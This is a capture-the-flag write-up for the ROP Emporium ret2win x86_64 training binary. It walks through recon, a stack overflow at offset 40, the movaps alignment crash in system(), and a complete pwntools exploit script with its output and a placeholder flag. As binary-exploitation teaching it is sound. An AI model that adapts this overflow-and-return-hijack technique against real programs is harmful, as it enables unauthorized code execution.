# ROP Emporium — ret2win (x86_64)

> **Category:** pwn / binary exploitation
> **Binary:** [ret2win](https://ropemporium.com/challenge/ret2win.html) (ROP Emporium, x86_64)
> **Techniques:** stack buffer overflow, ret2win, ROP stack alignment (movaps / SIGSEGV gotcha)
> **Environment:** authorized training binary, local lab

## 1. Recon

```
$ file ret2win
ret2win: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ readelf -l ret2win | grep GNU_STACK      # RW (no X)  -> NX enabled
$ readelf -h ret2win | grep Type
Type: EXEC (Executable file)               # no PIE -> .text at fixed addresses
```

No PIE and symbols present — the win function is right there:

```
$ nm ret2win | grep -iE " ret2win| main| pwnme"
0000000000400697 T main
00000000004006e8 t pwnme
0000000000400756 t ret2win
```

## 2. Vulnerability

`pwnme()` reads 56 bytes into a 32-byte stack buffer via `read(0, buf, 56)`:

```
400744:  call  400590 <read@plt>
```

Classic linear stack overflow: 32-byte buffer + 8-byte saved `rbp` = **offset 40**
to the saved return address.

`ret2win()` is the target. It prints the flag by calling `system()`:

```
0000000000400756 <ret2win>:
  400756:  push   %rbp
  400757:  mov    %rsp,%rbp
  40075a:  mov    $0x400926,%edi          ; "Well done! Here's your flag:"
  40075f:  call   400550 <puts@plt>
  400764:  mov    $0x400943,%edi          ; "/bin/cat flag.txt"
  400769:  call   400560 <system@plt>
```

## 3. First attempt — and the movaps wall

Naive payload: `40 * "A" + p64(0x400756)`.

```
$ python3 -c "..." | ./ret2win
> Thank you!
Well done! Here's your flag:
Segmentation fault (core dumped)          # exit=139, no flag
```

The crash happens **inside `system()`**, not at our hijack. Reason: modern
glibc uses `movaps` on the stack, which requires 16-byte alignment. When we
return directly into `ret2win`, `RSP` is 8 bytes off — `puts()` survives, but
`system()` hits a `movaps` on a misaligned address and dies with SIGSEGV.

Standard fix: prepend a single `ret` gadget to re-align the stack before
entering `ret2win`:

```
$ objdump -d ret2win | grep -E "^\s+40[0-9a-f]+:\s+c3\s+ret" | head -1
  40053e:  c3  ret
```

## 4. Exploit

`exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF("./ret2win", checksec=False)

RET      = 0x40053e   # ret gadget  (stack alignment for glibc movaps)
RET2WIN  = elf.symbols["ret2win"]   # 0x400756
OFFSET   = 40         # 32-byte buffer + 8-byte saved rbp

io = process("./ret2win")
payload = flat(
    b"A" * OFFSET,
    RET,        # align RSP to 16 bytes for system()
    RET2WIN,    # win()
)
io.sendline(payload)
print(io.recvall().decode(errors="replace"))
```

## 5. Result

```
$ python3 exploit.py
ret2win by ROP Emporium
x86_64
...
> Thank you!
Well done! Here's your flag:
ROPE{a_placeholder_32byte_flag!}
```

(Placeholder flag — this is the local training binary; the point is the
control-flow hijack succeeding cleanly with `exit=0`.)

## Takeaways

- ret2win is "trivial" only until modern glibc alignment bites you. If
  `system()` segfaults after a clean hijack, think **stack alignment** first.
- One `ret` gadget is the cheapest alignment shim you will ever use.
- No-PIE + symbols = static addresses; the whole chain is two qwords.
